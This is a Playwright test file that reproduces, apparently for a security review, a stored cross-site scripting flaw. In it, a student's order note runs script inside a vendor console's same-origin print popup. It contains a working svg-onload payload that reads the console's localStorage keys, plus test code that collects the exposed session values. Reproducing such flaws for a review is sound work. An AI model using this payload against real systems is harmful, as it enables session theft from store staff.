import { expect, test } from "@playwright/test";
import { mockBackend, signIn } from "./mockApi";

// Review reproduction (not part of the product's test suite).
// A student-controlled order note is written unescaped into the "Batch KOT" print window.
// The window is same-origin with the console, so script in it can read the store's session.
const NOTE = `<svg onload="opener.document.title='PWNED '+Object.keys(opener.localStorage).join(',')">`;

test.use({ viewport: { width: 1280, height: 800 }, isMobile: false, hasTouch: false });

test("order note runs script in the vendor console's origin when tickets are printed", async ({ page }) => {
  expect(NOTE.length).toBeLessThanOrEqual(140); // fits the database limit on notes
  await mockBackend(page);
  await page.addInitScript((note) => {
    localStorage.setItem("poolit-vendor-advanced-mode-v1", "true");
    const realFetch = window.fetch.bind(window);
    window.fetch = async (...args: Parameters<typeof fetch>) => {
      const res = await realFetch(...args);
      const url = typeof args[0] === "string" ? args[0] : ((args[0] as Request).url ?? String(args[0]));
      if (!url.includes("/vendor/overview")) return res;
      const body = await res.clone().json();
      for (const o of body.orders ?? []) o.note = note;
      return new Response(JSON.stringify(body), { status: res.status, headers: { "Content-Type": "application/json" } });
    };
    // Headless browsers have no print dialog to dismiss.
    window.print = () => undefined;
  }, NOTE);

  await signIn(page);
  await page.goto("/orders");
  const popupPromise = page.waitForEvent("popup");
  await page.getByRole("button", { name: /Batch KOT/i }).click();
  const popup = await popupPromise;
  popup.on("console", (m) => console.log("POPUP CONSOLE:", m.type(), m.text()));
  popup.on("pageerror", (e) => console.log("POPUP ERROR:", e.message));
  console.log("POPUP URL:", popup.url());
  console.log("POPUP ORIGIN:", await popup.evaluate(() => self.origin), "| HAS OPENER:", await popup.evaluate(() => !!window.opener));
  console.log("POPUP HTML:", (await popup.content()).replace(/\s+/g, " ").slice(-420));
  await expect.poll(() => page.title(), { timeout: 8_000 }).toMatch(/^PWNED /);
  const title = await page.title();
  console.log("CONSOLE TAB TITLE AFTER PRINT:", title);
  const keys = title.replace("PWNED ", "").split(",");
  const session = await page.evaluate((ks) => ks.map((k) => [k, (localStorage.getItem(k) ?? "").slice(0, 70)]), keys);
  console.log("READABLE BY THE INJECTED SCRIPT:", JSON.stringify(session));
});
